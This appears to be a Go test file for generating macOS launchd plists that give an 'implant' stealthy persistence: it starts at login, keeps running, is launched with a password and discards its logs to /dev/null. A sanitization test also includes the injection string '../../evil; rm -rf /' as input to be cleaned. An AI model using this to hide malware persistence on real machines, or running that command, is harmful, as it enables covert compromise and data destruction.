package commands

import (
	"encoding/xml"
	"strings"
	"testing"
)

// launchd plist 生成是纯逻辑，在非 macOS 上也能校验 —— 这正是把它从 darwin 专用文件
// 里拆出来的原因：持久化配置错了只能在 macOS 上发现，代价太高。

// parsePlist 用 XML 解析器校验结构（launchd 用 CFPropertyList，但 XML 合法性是前提）
func parsePlist(t *testing.T, content string) map[string]interface{} {
	t.Helper()
	dec := xml.NewDecoder(strings.NewReader(content))
	var stack []string
	values := map[string]interface{}{}
	var lastKey string
	var text strings.Builder
	var arrayDepth int
	var arrayItems []string
	for {
		tok, err := dec.Token()
		if err != nil {
			break
		}
		switch e := tok.(type) {
		case xml.StartElement:
			stack = append(stack, e.Name.Local)
			switch e.Name.Local {
			case "array":
				arrayDepth++
				arrayItems = nil
			case "true", "false":
				if lastKey != "" {
					values[lastKey] = e.Name.Local == "true"
				}
			}
			text.Reset()
		case xml.CharData:
			text.Write(e)
		case xml.EndElement:
			name := e.Name.Local
			if len(stack) > 0 {
				stack = stack[:len(stack)-1]
			}
			switch name {
			case "key":
				lastKey = text.String()
			case "string":
				if arrayDepth > 0 {
					arrayItems = append(arrayItems, text.String())
				} else if lastKey != "" {
					values[lastKey] = text.String()
				}
			case "array":
				arrayDepth--
				if lastKey != "" {
					values[lastKey] = arrayItems
				}
			}
			text.Reset()
		}
	}
	return values
}

func TestBuildLaunchdPlist(t *testing.T) {
	content := buildLaunchdPlist("com.demo.agent", "/Users/x/.cache/agent", []string{"pass123", "--quiet"})
	values := parsePlist(t, content)

	if values["Label"] != "com.demo.agent" {
		t.Fatalf("Label = %v", values["Label"])
	}
	if values["RunAtLoad"] != true || values["KeepAlive"] != true {
		t.Fatalf("RunAtLoad/KeepAlive 应为 true: %v", values)
	}
	// 启动参数必须包含可执行路径与原始参数：生成时设了口令的植入体不带口令会直接退出
	args, ok := values["ProgramArguments"].([]string)
	if !ok || len(args) != 3 {
		t.Fatalf("ProgramArguments = %v", values["ProgramArguments"])
	}
	if args[0] != "/Users/x/.cache/agent" || args[1] != "pass123" || args[2] != "--quiet" {
		t.Fatalf("ProgramArguments 内容不符: %v", args)
	}
	// 输出丢弃（不往用户可见位置写日志）
	if values["StandardOutPath"] != "/dev/null" || values["StandardErrorPath"] != "/dev/null" {
		t.Fatalf("标准输出/错误应指向 /dev/null: %v", values)
	}
	// 头部必须是合法 plist
	if !strings.Contains(content, `<plist version="1.0">`) || !strings.Contains(content, "<!DOCTYPE plist") {
		t.Fatal("缺少 plist 声明/DOCTYPE")
	}
}

// TestBuildLaunchdPlistEscapesXML 路径与参数里的 XML 特殊字符必须转义，
// 否则 plist 解析失败 → launchd 拒绝加载 → 持久化静默失效
func TestBuildLaunchdPlistEscapesXML(t *testing.T) {
	exe := `/Users/a&b/<x>/agent'q"z`
	args := []string{`p&ss<1>`, `a"b'c`}
	content := buildLaunchdPlist("com.demo.agent", exe, args)

	// 原始字符不得出现在 XML 文本里（& 必须被转义）
	if strings.Contains(content, "<x>") {
		t.Fatal("路径中的 < > 未转义")
	}
	if strings.Contains(content, `q"z`) {
		t.Fatal("路径中的引号未转义")
	}
	values := parsePlist(t, content)
	gotArgs, _ := values["ProgramArguments"].([]string)
	if len(gotArgs) != 3 || gotArgs[0] != exe || gotArgs[1] != args[0] || gotArgs[2] != args[1] {
		t.Fatalf("转义后回读不一致: %v", gotArgs)
	}
}

func TestLaunchdLabelSanitization(t *testing.T) {
	cases := map[string]string{
		"agent":                  "com.agent.agent",
		"my agent (copy)":        "com.myagentcopy.agent",
		"../../evil":             "com.evil.agent",
		"a/b\\c":                 "com.abc.agent",
		"":                       "com.agent.agent",
		strings.Repeat("x", 100): "com." + strings.Repeat("x", 40) + ".agent",
	}
	for in, want := range cases {
		if got := launchdPlistLabel(in); got != want {
			t.Errorf("launchdPlistLabel(%q) = %q，期望 %q", in, got, want)
		}
	}
	// 带自定义 label 时只保留安全字符（label 会进文件名与 launchctl 命令）
	if got := sanitizeLabelPart("../../evil; rm -rf /"); got != "evilrm-rf" {
		t.Errorf("sanitizeLabelPart 未净化: %q", got)
	}
}

// TestLaunchdLaunchArgs 载入顺序：优先新版 bootstrap，失败再退回 load -w
func TestLaunchdLaunchArgs(t *testing.T) {
	cands := launchdLaunchArgs("/Users/x/Library/LaunchAgents/a.plist", "501")
	if len(cands) < 2 {
		t.Fatalf("候选命令不足: %v", cands)
	}
	if cands[0][1] != "bootstrap" || cands[0][2] != "gui/501" {
		t.Fatalf("首选应为 bootstrap gui/<uid>: %v", cands[0])
	}
	if cands[1][1] != "load" || cands[1][2] != "-w" {
		t.Fatalf("回退应为 load -w: %v", cands[1])
	}
}
